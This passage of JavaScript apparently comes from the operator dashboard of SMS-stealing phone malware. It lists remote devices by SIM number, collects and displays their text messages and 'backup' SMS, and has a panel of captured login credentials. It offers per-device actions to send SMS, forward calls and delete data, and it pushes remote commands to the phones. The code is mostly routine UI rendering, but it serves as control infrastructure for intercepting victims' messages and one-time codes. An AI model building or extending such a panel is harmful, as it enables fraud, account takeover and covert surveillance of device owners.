                        <span><i class="fas fa-sim-card"></i> ${escapeHtml(dev.numberSim1 || dev.sim1 || 'No SIM')}</span>
                        ${dev.numberSim2 || dev.sim2 ? `<span><i class="fas fa-sim-card"></i> ${escapeHtml(dev.numberSim2 || dev.sim2)}</span>` : ''}
                    </div>
                </div>
                <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px;">
                    <span class="status-badge-premium ${statusClass}">
                        <span class="status-dot"></span>
                        ${statusText}
                    </span>
                    <div class="last-seen-premium">
                        <i class="far fa-clock"></i> ${dateStr ? dateStr + ' ' : ''}${timeStr}
                    </div>
                    <button class="check-status-btn-premium" onclick="event.stopPropagation();checkDeviceStatus('${devId}')" title="Check Status">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                </div>
            </div>
            
            <div class="info-grid-premium" onclick="toggleDevice('${devId}')">
                <div class="info-item-premium">
                    <span class="info-label">Device</span>
                    <span class="info-value">${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
                </div>
                <div class="info-item-premium">
                    <span class="info-label">SIM 1</span>
                    <span class="info-value ${dev.numberSim1 || dev.sim1 ? '' : 'sim-empty'}">${escapeHtml(dev.numberSim1 || dev.sim1 || 'No SIM')}</span>
                </div>
                <div class="info-item-premium">
                    <span class="info-label">SIM 2</span>
                    <span class="info-value ${dev.numberSim2 || dev.sim2 ? '' : 'sim-empty'}">${escapeHtml(dev.numberSim2 || dev.sim2 || 'No SIM')}</span>
                </div>
                <div class="info-item-premium">
                    <span class="info-label">Serial</span>
                    <span class="info-value highlight">${serial > 0 ? serial : '—'}</span>
                </div>
            </div>
            
            <div class="expand-hint" onclick="toggleDevice('${devId}')">
                <i class="fas fa-chevron-down"></i>
                ${isExpanded ? 'Click to collapse' : 'Click to expand'}
            </div>
            
            <div class="expandable-content">
                <div class="actions-row-premium">
                    ${actionsHtml}
                </div>
                ${sectionsHtml}
            </div>
        </div>
    `;
}

// ============================================================
// TOGGLE DEVICE
// ============================================================
function toggleDevice(devId) {
    if (state.pendingUpdates.has(devId)) return;
    state.pendingUpdates.add(devId);
    
    try {
        const current = state.expandedDevices.get(devId) || false;
        state.expandedDevices.set(devId, !current);
        
        const card = document.getElementById(`card-${devId}`);
        if (card) {
            card.classList.toggle('expanded');
            const hint = card.querySelector('.expand-hint');
            if (hint) {
                hint.innerHTML = `<i class="fas fa-chevron-down"></i> ${state.expandedDevices.get(devId) ? 'Click to collapse' : 'Click to expand'}`;
            }
            if (state.expandedDevices.get(devId)) {
                setTimeout(() => {
                    checkDeviceStatus(devId);
                    if (state.activeTabs.get(devId) === 'login') {
                        setTimeout(() => autoScrollCredentials(devId), 400);
                    }
                }, 200);
            }
        }
    } finally {
        setTimeout(() => {
            state.pendingUpdates.delete(devId);
        }, 300);
    }
}

// ============================================================
// SET TAB
// ============================================================
function setTab(devId, tab) {
    if (state.pendingUpdates.has(devId)) return;
    state.pendingUpdates.add(devId);
    
    try {
        const current = state.activeTabs.get(devId);
        if (current === tab) {
            state.activeTabs.delete(devId);
        } else {
            state.activeTabs.set(devId, tab);
            if (tab === 'backup') refreshDeviceBackup(devId);
        }
        
        const card = document.getElementById(`card-${devId}`);
        if (!card) {
            state.pendingUpdates.delete(devId);
            return;
        }
        
        const buttons = card.querySelectorAll('.action-btn-premium');
        const activeTab = state.activeTabs.get(devId);
        
        buttons.forEach(btn => {
            btn.className = 'action-btn-premium';
            const text = btn.textContent.trim();
            if (text.includes('SMS') && activeTab === 'sms') btn.classList.add('active-sms');
            else if (text.includes('Login') && activeTab === 'login') btn.classList.add('active-login');
            else if (text.includes('Call') && activeTab === 'call') btn.classList.add('active-call');
            else if (text.includes('Send') && activeTab === 'sendsms') btn.classList.add('active-sendsms');
            else if (text.includes('Forward') && activeTab === 'fwd') btn.classList.add('active-fwd');
            else if (text.includes('Backup') && activeTab === 'backup') btn.classList.add('active-backup');
            else if (text.includes('Delete') && activeTab === 'delete') btn.classList.add('active-delete');
        });
        
        const sections = card.querySelectorAll('.section-premium');
        sections.forEach(sec => sec.classList.remove('active'));
        
        if (activeTab) {
            const activeSec = card.querySelector(`#sec-${activeTab}-${devId}`);
            if (activeSec) activeSec.classList.add('active');
            if (activeTab === 'login') {
                setTimeout(() => autoScrollCredentials(devId), 400);
            }
        }
    } finally {
        setTimeout(() => {
            state.pendingUpdates.delete(devId);
        }, 300);
    }
}

// ============================================================
// SEARCH DEVICES
// ============================================================
let searchTimeout = null;

function searchDevices(query) {
    if (searchTimeout) {
        clearTimeout(searchTimeout);
    }
    searchTimeout = setTimeout(() => {
        state.searchQuery = query.toLowerCase().trim();
        state.deviceOffset = 0;
        renderDevicesOptimized();
        searchTimeout = null;
    }, 300);
}

function clearSearch() {
    if (searchTimeout) {
        clearTimeout(searchTimeout);
        searchTimeout = null;
    }
    state.searchQuery = '';
    const input = $('deviceSearchInput');
    if (input) input.value = '';
    const clearBtn = $('searchClearBtn');
    if (clearBtn) clearBtn.style.display = 'none';
    state.deviceOffset = 0;
    renderDevicesOptimized();
}

// ============================================================
// LOAD MORE / PREVIOUS DEVICES
// ============================================================
function loadMoreDevices() {
    const keys = getFilteredDeviceKeys();
    if (state.deviceOffset + DEVICE_LIMIT < keys.length) {
        state.deviceOffset += DEVICE_LIMIT;
        renderDevicesOptimized();
    } else {
        showToast('📭 No more devices to load', 'info');
    }
}

function loadPrevDevices() {
    state.deviceOffset = Math.max(0, state.deviceOffset - DEVICE_LIMIT);
    renderDevicesOptimized();
}

// ============================================================
// CHECK DEVICE STATUS
// ============================================================
function checkDeviceStatus(devId) {
    if (!devId) return;
    const statusEl = document.querySelector(`#card-${devId} .status-badge-premium`);
    if (!statusEl) return;
    
    statusEl.className = 'status-badge-premium checking';
    statusEl.innerHTML = '<span class="status-dot"></span> Checking...';
    
    db.ref(`user_data/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            const dev = snap.val();
            const isOnline = dev.isOnline || dev.online || false;
            const lastSeen = dev.last_online || dev.timestamp || 0;
            const currentTime = Date.now();
            const isRecent = (currentTime - lastSeen) < 120000;
            const finalStatus = isOnline || isRecent;
            
            state.deviceOnlineStatus.set(devId, finalStatus);
            updateDeviceStatusUI(devId, finalStatus, lastSeen);
            showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
        } else {
            statusEl.className = 'status-badge-premium offline';
            statusEl.innerHTML = '<span class="status-dot"></span> Not Found';
            showToast('❌ Device not found', 'error');
        }
    }).catch(() => {
        statusEl.className = 'status-badge-premium offline';
        statusEl.innerHTML = '<span class="status-dot"></span> Error';
        showToast('❌ Error checking status', 'error');
    });
}

function updateDeviceStatusUI(devId, isOnline, lastSeen) {
    const statusEl = document.querySelector(`#card-${devId} .status-badge-premium`);
    const timeEl = document.querySelector(`#card-${devId} .last-seen-premium`);
    
    if (statusEl) {
        statusEl.className = `status-badge-premium ${isOnline ? 'online' : 'offline'}`;
        statusEl.innerHTML = `<span class="status-dot"></span> ${isOnline ? 'Online' : 'Offline'}`;
    }
    
    if (timeEl) {
        const dateStr = lastSeen ? new Date(lastSeen).toLocaleDateString() : '';
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
        timeEl.innerHTML = `<i class="far fa-clock"></i> ${dateStr ? dateStr + ' ' : ''}${timeStr}`;
    }
}

// ============================================================
// TOGGLE PANEL
// ============================================================
function togglePanel(panel) {
    const panels = ['devices', 'favourites', 'sms', 'credentials', 'backup', 'analytics'];
    
    panels.forEach(p => {
        if (p !== panel) {
            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
            if (el) el.classList.remove('active');
            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
            if (nav) nav.classList.remove('active');
            const mobileNav = document.querySelector(`.mobile-nav-item[data-panel="${p}"]`);
            if (mobileNav) mobileNav.classList.remove('active');
            state.isPanelOpen[p] = false;
        }
    });
    
    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);
    const mobileNav = document.querySelector(`.mobile-nav-item[data-panel="${panel}"]`);
    
    if (panelEl) {
        state.isPanelOpen[panel] = !state.isPanelOpen[panel];
        if (state.isPanelOpen[panel]) {
            panelEl.classList.add('active');
            if (nav) nav.classList.add('active');
            if (mobileNav) mobileNav.classList.add('active');
            if (panel === 'favourites') renderFavouritesCatalog();
            if (panel === 'credentials') renderCredentialsCatalog();
            performRender();
        } else {
            panelEl.classList.remove('active');
            if (nav) nav.classList.remove('active');
            if (mobileNav) mobileNav.classList.remove('active');
        }
    }
}

// ============================================================
// FILTER DEVICES
// ============================================================
function filterDevices(filter) {
    state.currentFilter = filter;
    state.deviceOffset = 0;
    
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    if (filter === 'all') {
        const el = $('filterAll');
        if (el) el.classList.add('active');
    } else if (filter === 'online') {
        const el = $('filterOnline');
        if (el) el.classList.add('active');
    } else if (filter === 'offline') {
        const el = $('filterOffline');
        if (el) el.classList.add('active');
    }
    
    renderDevicesOptimized();
}

// ============================================================
// RENDER SMS CARDS
// ============================================================
function renderSmsCards(list, showDevice = false) {
    if (!list || list.length === 0) return '';
    
    return list.map((msg, index) => {
        const deviceId = msg.deviceId || msg.device_id || '';
        const sender = msg.sender || msg.address || msg.from || 'Unknown';
        const body = msg.body || msg.message || msg.text || 'No content';
        const date = msg.date_formatted || msg.date || msg.timestamp_formatted || '';
        const simNumber = msg.sim_number || msg.sim || msg.simSlot || '';
        const timestamp = msg.timestamp || msg.date || 0;
        
        let displayDate = date;
        if (!displayDate && timestamp) {
            try {
                displayDate = new Date(timestamp).toLocaleString();
            } catch(e) {
                displayDate = '';
            }
        }
        
        return `
            <div class="sms-card-luxury" data-index="${index}">
                <div class="sms-header">
                    <div class="sms-sender">
                        ${showDevice && deviceId ? 
                            `<span class="device-tag" onclick="filterSmsByDevice('${escapeHtml(deviceId)}')">[${escapeHtml(deviceId)}]</span> ` 
                            : ''}
                        👤 ${escapeHtml(sender)}
                    </div>
                    <div class="sms-meta">
                        ${escapeHtml(displayDate)} 
                        ${simNumber ? '• ' + escapeHtml(simNumber) : ''}
                    </div>
                </div>
                <div class="sms-body">${escapeHtml(body)}</div>
            </div>
        `;
    }).join('');
}

// ============================================================
// RENDER ALL SMS - FIXED LOAD MORE
// ============================================================
function renderAllSmsOptimized() {
    const container = $('allSmsContainer');
    const loadMore = $('allSmsLoadMore');
    if (!container) return;
    
    if (state.allSmsOffset === 0) {
        state.allSmsList = [];
        const smsData = state.data.user_sms || {};
        
        Object.keys(smsData).forEach(devId => {
            if (state.smsFilterDevice && state.smsFilterDevice !== devId) return;
            const msgs = smsData[devId];
            if (msgs) {
                Object.keys(msgs).forEach(k => {
                    const msg = msgs[k];
                    if (msg && typeof msg === 'object') {
                        state.allSmsList.push({ 
                            deviceId: devId, 
                            ...msg,
                            sender: msg.sender || msg.address || 'Unknown',
                            body: msg.body || msg.message || 'No content',
                            timestamp: msg.timestamp || msg.date || 0
                        });
                    }
                });
            }
        });
        
        state.allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        
        const countEl = $('panelSmsCount');
        if (countEl) {
            const total = state.allSmsList.length;
            countEl.textContent = state.smsFilterDevice ? total + ' (filtered)' : total;
        }
    }
    
    if (state.allSmsList.length === 0) {
        const msg = state.smsFilterDevice 
            ? 'No messages for ' + escapeHtml(state.smsFilterDevice) 
            : 'No messages found';
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${msg}</div>`;
        if (loadMore) {
            loadMore.style.display = 'none';
            const newLoadMore = loadMore.cloneNode(true);
            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
        }
        return;
    }
    
    const start = state.allSmsOffset;
    const end = Math.min(start + SMS_LIMIT, state.allSmsList.length);
    const paginated = state.allSmsList.slice(start, end);
    const newHtml = renderSmsCards(paginated, true);
    
    if (state.allSmsOffset === 0) {
        container.innerHTML = newHtml;
    } else {
        container.innerHTML += newHtml;
    }
    
    // FIXED: Proper Load More button handling
    const loadMoreBtn = document.getElementById('allSmsLoadMore');
    if (loadMoreBtn) {
        if (end < state.allSmsList.length) {
            loadMoreBtn.style.display = 'block';
            loadMoreBtn.innerHTML = `📥 Load More (${state.allSmsList.length - end} remaining)`;
            
            // Remove old event listeners
            const newLoadMore = loadMoreBtn.cloneNode(true);
            loadMoreBtn.parentNode.replaceChild(newLoadMore, loadMoreBtn);
            
            // Add new click handler
            newLoadMore.addEventListener('click', function() {
                loadMoreAllSms();
            });
            newLoadMore.onclick = function() {
                loadMoreAllSms();
            };
        } else {
            loadMoreBtn.style.display = 'none';
            const newLoadMore = loadMoreBtn.cloneNode(true);
            loadMoreBtn.parentNode.replaceChild(newLoadMore, loadMoreBtn);
        }
    }
}

// ============================================================
// LOAD MORE ALL SMS - FIXED
// ============================================================
function loadMoreAllSms() {
    const total = state.allSmsList.length;
    const currentOffset = state.allSmsOffset;
    
    if (currentOffset + SMS_LIMIT < total) {
        state.allSmsOffset += SMS_LIMIT;
        renderAllSmsOptimized();
        showToast(`📥 Loaded more messages (${Math.min(currentOffset + SMS_LIMIT, total)}/${total})`, 'info', 1500);
    } else {
        showToast('📭 No more messages to load', 'info');
        const loadMore = $('allSmsLoadMore');
        if (loadMore) {
            loadMore.style.display = 'none';
            const newLoadMore = loadMore.cloneNode(true);
            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
        }
    }
}

// ============================================================
// FILTER SMS BY DEVICE - FIXED
// ============================================================
function filterSmsByDevice(deviceId) {
    state.smsFilterDevice = deviceId;
    const clearBtn = $('clearSmsFilterBtn');
    if (clearBtn) clearBtn.style.display = 'inline-block';
    state.allSmsOffset = 0;
    showToast(`📱 Filtering: ${deviceId}`, 'info');
    
    if (!state.isPanelOpen.sms) {
        togglePanel('sms');
    } else {
        renderAllSmsOptimized();
    }
}

function clearSmsFilter() {
    state.smsFilterDevice = null;
    const clearBtn = $('clearSmsFilterBtn');
    if (clearBtn) clearBtn.style.display = 'none';
    state.allSmsOffset = 0;
    renderAllSmsOptimized();
    showToast('✅ Filter cleared', 'success');
}

// ============================================================
// RENDER ANALYTICS
// ============================================================
function renderAnalytics() {
    const devices = state.data.user_data || {};
    const totalDevices = $('analyticsTotalDevices');
    if (totalDevices) totalDevices.textContent = Object.keys(devices).length;
    
    const smsData = state.data.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => totalSms += Object.keys(smsData[d]).length);
    const totalSmsEl = $('analyticsTotalSms');
    if (totalSmsEl) totalSmsEl.textContent = totalSms;
    
    const backupData = state.data.backup_sms || {};
    let backupCount = 0;
    Object.keys(backupData).forEach(d => backupCount += Object.keys(backupData[d]).length);
    const backupSmsEl = $('analyticsBackupSms');
    if (backupSmsEl) backupSmsEl.textContent = backupCount;
    
    let latest = 0;
    Object.keys(smsData).forEach(d => {
        const msgs = smsData[d];
        Object.keys(msgs).forEach(k => {
            const ts = msgs[k].timestamp || 0;
            if (ts > latest) latest = ts;
        });
    });
    const lastActivityEl = $('analyticsLastActivity');
    if (lastActivityEl) {
        if (latest > 0) {
            const d = new Date(latest);
            lastActivityEl.textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        } else {
            lastActivityEl.textContent = '—';
        }
    }
}

// ============================================================
// RENDER BACKUP PANEL
// ============================================================
function renderBackupPanel() {
    const select = $('backupDeviceSelect');
    if (!select) return;
    
    const devices = state.data.user_data || {};
    const keys = Object.keys(devices);
    const current = select.value;
    
    const currentOptions = Array.from(select.options).map(o => o.value);
    const newOptions = ['', ...keys];
    
    if (JSON.stringify(currentOptions) !== JSON.stringify(newOptions)) {
        select.innerHTML = '<option value="">— Select a device —</option>';
        keys.forEach(id => {
            const dev = devices[id];
            const name = dev.d_name || dev.device_name || id;
            const serial = state.deviceSerialMap.get(id) || 0;
            const label = serial > 0 ? `#${serial} ${name}` : name;
            select.innerHTML += `<option value="${escapeHtml(id)}">${escapeHtml(label)}</option>`;
        });
        if (current && keys.includes(current)) select.value = current;
    }
    
    if (select.value) {
        updateBackupStatusDisplay(select.value);
        loadBackupSmsForDevice(select.value);
    }
}

// ============================================================
// BACKUP FUNCTIONS
// ============================================================
function updateBackupStatusDisplay(devId) {
    const dev = state.data.user_data?.[devId];
    if (!dev) {
        const statusEl = $('backupStatusValue');
        if (statusEl) {
            statusEl.textContent = 'Device not found';
            statusEl.className = 'status-value failed';
        }
        return;
    }
    
    const status = dev.backup_status || {};
    const info = dev.backup_info || {};
    const st = status.backup_status || 'No backup';
    const msg = status.backup_message || '';
    
    const statusEl = $('backupStatusValue');
    if (statusEl) {
        if (st === 'success') {
            statusEl.textContent = '✅ ' + (msg || 'Backup successful');
            statusEl.className = 'status-value success';
        } else if (st === 'in_progress' || st === 'pending') {
            statusEl.textContent = '⏳ ' + (msg || 'In progress...');
            statusEl.className = 'status-value pending';
        } else if (st === 'failed' || st === 'error') {
            statusEl.textContent = '❌ ' + (msg || 'Backup failed');
            statusEl.className = 'status-value failed';
        } else {
            statusEl.textContent = '📊 ' + (msg || 'No backup');
            statusEl.className = 'status-value';
        }
    }
    
    const last = info.last_backup_time || info.timestamp || null;
    const lastTimeEl = $('backupLastTime');
    if (lastTimeEl) lastTimeEl.textContent = last ? new Date(last).toLocaleString() : 'Never';
    
    const count = info.latest_backup_count || info.sms_count || 0;
    const smsCountEl = $('backupSmsCount');
    if (smsCountEl) smsCountEl.textContent = count + ' SMS';
    
    const backupIdEl = $('backupId');
    if (backupIdEl) backupIdEl.textContent = info.backup_id || status.backup_id || 'N/A';
    
    const badge = $('backupStatusBadge');
    if (badge) badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
    
    const backupData = state.data.backup_sms;
    if (backupData && backupData[devId]) {
        const msgs = Object.keys(backupData[devId]);
        if (smsCountEl) {
            smsCountEl.textContent = msgs.length + ' SMS (Backup)';
        }
    }
}

function triggerBackup() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    triggerDeviceBackup(devId);
}

function triggerDeviceBackup(devId) {
    if (!devId) return;
    const statusEl = $('backupStatusValue');
    if (statusEl) {
        statusEl.textContent = '⏳ Sending...';
        statusEl.className = 'status-value pending';
    }
    
    db.ref(`user_data/${devId}`).update({
        device: devId,
        command: 'backup',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Backup command sent to ${devId}`, 'success');
        setTimeout(refreshBackupStatus, 3000);
    }).catch(() => {
        if (statusEl) {
            statusEl.textContent = '❌ Failed';
            statusEl.className = 'status-value failed';
        }
        showToast('❌ Failed to send', 'error');
    });
}

function refreshBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    
    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        if (snap.exists()) {
            if (!state.data.user_data) state.data.user_data = {};
            if (!state.data.user_data[devId]) state.data.user_data[devId] = {};
            state.data.user_data[devId].backup_status = snap.val();
        }
        updateBackupStatusDisplay(devId);
        loadBackupSmsForDevice(devId);
        showToast('✅ Status refreshed', 'success');
    }).catch(() => showToast('❌ Failed', 'error'));
}

function refreshDeviceBackup(devId) {
    const div = document.getElementById(`deviceBackup-${devId}`);
    if (!div) return;
    div.innerHTML = '⏳ Checking...';
    
    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        let html = '';
        if (snap.exists()) {
            const data = snap.val();
            const st = data.backup_status || 'Unknown';
            const msg = data.backup_message || '';
            let color = 'var(--text-muted)';
            let icon = '📊';
            if (st === 'success') { color = 'var(--green)'; icon = '✅'; }
            else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b'; icon = '⏳'; }
            else if (st === 'failed' || st === 'error') { color = 'var(--red)'; icon = '❌'; }
            html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
            
            db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
                if (infoSnap.exists()) {
                    const info = infoSnap.val();
                    const count = info.latest_backup_count || info.sms_count || 0;
                    const last = info.last_backup_time || info.timestamp || null;
                    html += `<div style="font-size:10px;color:var(--text-muted);margin-top:3px;">📨 ${count} SMS | ${last ? '📅 ' + new Date(last).toLocaleString() : 'No time'}</div>`;
                }
                
                const backupData = state.data.backup_sms;
                if (backupData && backupData[devId]) {
                    const actualCount = Object.keys(backupData[devId]).length;
                    html += `<div style="font-size:10px;color:var(--green);margin-top:2px;">💾 ${actualCount} backup messages stored</div>`;
                    
                    const messages = [];
                    Object.keys(backupData[devId]).forEach(key => {
                        const msg = backupData[devId][key];
                        msg._timestamp = msg.timestamp || msg.date || 0;
                        messages.push(msg);
                    });
                    messages.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
                    
                    if (messages.length > 0) {
                        const latest = messages[0];
                        const sender = latest.sender || latest.address || 'Unknown';
                        const body = latest.body || 'No content';
                        const time = latest.timestamp ? new Date(latest.timestamp).toLocaleString() : '';
                        html += `<div style="font-size:10px;color:var(--text-secondary);margin-top:4px;padding:4px 8px;background:var(--bg-input);border-radius:4px;border-left:2px solid var(--gold);">
                            <span style="font-weight:600;">⬇️ Latest Backup:</span>
                            👤 ${escapeHtml(sender)} ${time ? '🕐 ' + escapeHtml(time) : ''}
                            <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">${escapeHtml(body.substring(0, 50))}${body.length > 50 ? '...' : ''}</div>
                        </div>`;
                    }
                }
                
                div.innerHTML = html;
            });
        } else {
            div.innerHTML = '📊 No backup status';
        }
    }).catch(() => {
        div.innerHTML = '❌ Error loading';
    });
}

function clearBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    if (!confirm(`Clear backup status for ${devId}?`)) return;
    
    db.ref(`user_data/${devId}/backup_status`).remove().then(() => {
        db.ref(`user_data/${devId}/backup_info`).remove().then(() => {
            showToast(`✅ Cleared for ${devId}`, 'success');
            updateBackupStatusDisplay(devId);
            loadBackupSmsForDevice(devId);
        });
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// LOAD BACKUP SMS FOR DEVICE
// ============================================================
function loadBackupSmsForDevice(devId) {
    const container = $('backupSmsList');
    if (!devId) {
        if (container) container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
        return;
    }
    
    const backupData = state.data.backup_sms;
    if (backupData && backupData[devId]) {
        renderBackupSmsList(container, backupData[devId], devId);
        return;
    }
    
    if (container) {
        container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
    }
    
    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            renderBackupSmsList(container, snap.val(), devId);
        } else {
            if (container) container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
        }
    }).catch(() => {
        if (container) container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderBackupSmsList(container, data, devId) {
    if (!container) return;
    const messages = [];
    Object.keys(data).forEach(key => {
        const msgData = { key, ...data[key] };
        msgData._timestamp = msgData.timestamp || msgData.date || Date.now();
        messages.push(msgData);
    });
    messages.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
    
    if (messages.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }
    
    container.innerHTML = messages.map((msg, index) => {
        const isLatest = index === 0;
        const backupTag = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST BACKUP</span>` : `<span style="background:rgba(212,175,55,0.15);color:var(--gold);font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;border:1px solid rgba(212,175,55,0.2);">💾 BACKUP</span>`;
        
        const timestamp = msg.timestamp || msg.date || '';
        let displayTime = '';
        if (timestamp) {
            try {
                const d = new Date(timestamp);
                displayTime = d.toLocaleString();
            } catch(e) { displayTime = ''; }
        }
        
        return `
            <div class="backup-sms-item" style="${isLatest ? 'border-left: 3px solid var(--green);' : ''}">
                <div class="sms-header">
                    <span class="sender">
                        👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
                        ${backupTag}
                    </span>
                    <span>${displayTime ? escapeHtml(displayTime) : escapeHtml(msg.date_formatted || msg.date || '')}</span>
                </div>
                <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
                <div style="font-size:9px;color:var(--text-muted);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;">
                    ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
                    ${msg.backup_id ? ' • 💾 ID: ' + escapeHtml(msg.backup_id) : ''}
                    ${msg.device_id ? ' • 📱 Device: ' + escapeHtml(msg.device_id) : ''}
                </div>
            </div>
        `;
    }).join('');
}

// ============================================================
// MODAL FUNCTIONS
// ============================================================
function openBackupSmsModal() {
    const modal = $('backupSmsModal');
    const body = $('backupModalBody');
    const title = $('backupModalTitle');
    if (title) title.textContent = '💾 All Backup Messages (Latest First)';
    if (body) body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
    if (modal) modal.classList.add('open');
    
    const backupData = state.data.backup_sms;
    if (backupData) {
        renderAllBackupSms(body, backupData);
        return;
    }
    
    db.ref('backup_sms').once('value').then(snap => {
        if (snap.exists()) {
            renderAllBackupSms(body, snap.val());
        } else {
            if (body) body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>No backup messages</div>';
        }
    }).catch(() => {
        if (body) body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderAllBackupSms(container, data) {
    if (!container) return;
    let allMsgs = [];
    Object.keys(data).forEach(devId => {
        const devMsgs = data[devId];
        Object.keys(devMsgs).forEach(key => {
            const msgData = { deviceId: devId, key, ...devMsgs[key] };
            msgData._timestamp = msgData.timestamp || msgData.date || Date.now();
            allMsgs.push(msgData);
        });
    });
    allMsgs.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
    
    if (allMsgs.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }
    
    container.innerHTML = allMsgs.map((msg, index) => {
        const isLatest = index === 0;
        const backupTag = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST BACKUP</span>` : `<span style="background:rgba(212,175,55,0.15);color:var(--gold);font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;border:1px solid rgba(212,175,55,0.2);">💾 BACKUP</span>`;
        
        const timestamp = msg.timestamp || msg.date || '';
        let displayTime = '';
        if (timestamp) {
            try {
                const d = new Date(timestamp);
                displayTime = d.toLocaleString();
            } catch(e) { displayTime = ''; }
        }
        
        return `
            <div class="backup-sms-item" style="${isLatest ? 'border-left: 3px solid var(--green);' : ''}">
                <div class="sms-header">
                    <span class="sender">
                        <span style="color:var(--gold-light);font-size:10px;">[${escapeHtml(msg.deviceId)}]</span>
                        👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
                        ${backupTag}
                    </span>
                    <span>${displayTime ? escapeHtml(displayTime) : escapeHtml(msg.date_formatted || msg.date || '')}</span>
                </div>
                <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
                <div style="font-size:9px;color:var(--text-muted);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;">
                    ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
                    ${msg.backup_id ? ' • 💾 ID: ' + escapeHtml(msg.backup_id) : ''}
                </div>
            </div>
        `;
    }).join('');
}

function closeBackupSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    const modal = $('backupSmsModal');
    if (modal) modal.classList.remove('open');
}

// ============================================================
// SMS MODAL - FIXED LOAD MORE
// ============================================================
function openSmsModal(target) {
    state.modalTarget = target;
    state.modalSmsOffset = 0;
    state.modalSmsList = [];
    
    const smsData = state.data.user_sms || {};
    if (target === 'ALL') {
        const title = $('modalTitle');
        if (title) title.textContent = '📩 All Messages';
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                state.modalSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
    } else {
        const title = $('modalTitle');
        if (title) title.textContent = `📩 Messages for ${target}`;
        if (smsData[target]) {
            Object.keys(smsData[target]).forEach(k => {
                state.modalSmsList.push(smsData[target][k]);
            });
        }
    }
    
    state.modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    renderModalSms();
    const modal = $('smsModal');
    if (modal) modal.classList.add('open');
}

function renderModalSms() {
    const body = $('modalBody');
    const loadMore = $('modalLoadMore');
    if (!body) return;
    
    const start = state.modalSmsOffset;
    const end = Math.min(start + SMS_LIMIT, state.modalSmsList.length);
    const paginated = state.modalSmsList.slice(start, end);
    const newHtml = renderSmsCards(paginated, state.modalTarget === 'ALL');
    
    if (state.modalSmsOffset === 0) {
        body.innerHTML = newHtml;
    } else {
        body.innerHTML += newHtml;
    }
    
    if (loadMore) {
        if (end < state.modalSmsList.length) {
            loadMore.style.display = 'block';
            loadMore.innerHTML = `📥 Load More (${state.modalSmsList.length - end} remaining)`;
            const newLoadMore = loadMore.cloneNode(true);
            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
            newLoadMore.onclick = function() {
                loadMoreModalSms();
            };
            newLoadMore.addEventListener('click', function() {
                loadMoreModalSms();
            });
        } else {
            loadMore.style.display = 'none';
